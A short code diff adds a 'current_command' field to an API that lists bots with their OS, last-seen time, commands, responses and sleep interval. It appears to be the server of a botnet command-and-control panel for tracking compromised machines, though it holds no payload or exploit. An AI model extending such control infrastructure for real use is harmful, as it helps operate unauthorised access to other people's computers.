@@ -51,6 +51,7 @@ def api_clients_list():
         data[bot.id]["OS"] = bot.os
         data[bot.id]["last_seen"] = bot.last_seen
         data[bot.id]["last_command"] = bot.last_command
+        data[bot.id]["current_command"] = bot.current_command
         data[bot.id]["last_response"] = bot.last_response
         data[bot.id]["set_interval"] = bot.sleep_interval
         if bot.ip in g.queue.keys():
